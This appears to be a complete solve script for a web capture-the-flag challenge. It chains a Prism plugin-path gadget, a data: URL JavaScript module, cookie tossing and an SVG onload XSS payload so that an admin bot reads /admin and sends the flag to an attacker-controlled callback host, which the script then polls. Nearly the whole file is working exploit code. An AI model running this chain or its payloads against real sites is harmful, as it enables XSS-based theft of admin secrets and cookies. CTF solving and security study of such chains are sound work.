from __future__ import annotations

import base64
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(r"pwnsec\{[^}]+\}")
STAGE_BODY = (
    "<p data-prism-plugins data-prism-plugin-path="
    "data:text/javascript,import(name)#>"
)


def endpoint(name: str) -> str:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    return next(item["url"].rstrip("/") for item in data["endpoints"] if item["name"] == name)


def request(url: str, *, data: bytes | None = None, headers: dict[str, str] | None = None,
            timeout: float = 90):
    return urllib.request.urlopen(
        urllib.request.Request(url, data=data, headers=headers or {}), timeout=timeout
    )


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def create_stage(stage: str) -> str:
    body = urllib.parse.urlencode({"title": "stage", "body": STAGE_BODY}).encode()
    req = urllib.request.Request(
        stage + "/notes", data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Sec-Fetch-Mode": "navigate"},
    )
    try:
        urllib.request.build_opener(NoRedirect()).open(req, timeout=20)
    except urllib.error.HTTPError as exc:
        if exc.code == 302 and exc.headers.get("Location"):
            return urllib.parse.urljoin(stage + "/", exc.headers["Location"])
        raise
    raise RuntimeError("stage creation did not redirect")


def create_receiver(callback: str) -> str:
    with request(
        callback + "/token", data=b"{}",
        headers={"Content-Type": "application/json", "Accept": "application/json"}, timeout=20,
    ) as response:
        return json.load(response)["uuid"]


def make_visit_url(stage_url: str, main: str, loader: str, callback: str, token: str) -> str:
    receiver = callback + "/" + token + "?flag="
    admin_code = (
        "document.cookie='FLAG=;Domain=chal.ctf.ae;Path=/admin;Max-Age=0';"
        "document.cookie='FLAG=;Domain=chal.ctf.ae;Path=/;Max-Age=0';"
        "fetch('/admin').then(r=>r.text()).then(t=>{let f=t.match(/pwnsec\\{[^}]+}/);"
        f"if(f)location={json.dumps(receiver)}+encodeURIComponent(f[0])}})"
    )
    admin_fragment = base64.b64encode(admin_code.encode()).decode()
    xss = "<svg/onload=eval(atob(location.hash.slice(1)))>"
    stage_code = (
        f"let p={json.dumps(xss)};"
        "document.cookie='FLAG='+p+';Domain=chal.ctf.ae;Path=/admin';"
        "document.cookie='FLAG='+p+';Domain=chal.ctf.ae;Path=/';"
        f"location={json.dumps(main + '/admin#' + admin_fragment)}"
    )
    module_url = "data:text/javascript," + urllib.parse.quote(stage_code, safe="")
    loader_html = f"<script>name={json.dumps(module_url)};location={json.dumps(stage_url)}</script>"
    return loader + "/" + base64.b64encode(loader_html.encode()).decode()


def trigger(main: str, visit_url: str) -> None:
    body = urllib.parse.urlencode({"url": visit_url}).encode()
    with request(
        main + "/report", data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=45,
    ) as response:
        if response.status != 200:
            raise RuntimeError(f"report returned HTTP {response.status}")


def receive_flag(callback: str, token: str) -> str:
    api = callback + f"/token/{token}/requests?sorting=newest"
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        with request(api, headers={"Accept": "application/json"}, timeout=20) as response:
            entries = json.load(response).get("data", [])
        for entry in entries:
            value = (entry.get("query") or {}).get("flag", "")
            match = FLAG_RE.fullmatch(value)
            if match:
                return match.group(0)
        time.sleep(1)
    raise RuntimeError("flag callback was not received")


def main() -> None:
    main_url = endpoint("main")
    stage_url = endpoint("stage")
    loader = endpoint("loader")
    callback = endpoint("callback")
    stage_note = create_stage(stage_url)
    token = create_receiver(callback)
    trigger(main_url, make_visit_url(stage_note, main_url, loader, callback, token))
    sys.stdout.buffer.write(receive_flag(callback, token).encode("utf-8"))


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        raise SystemExit(1)
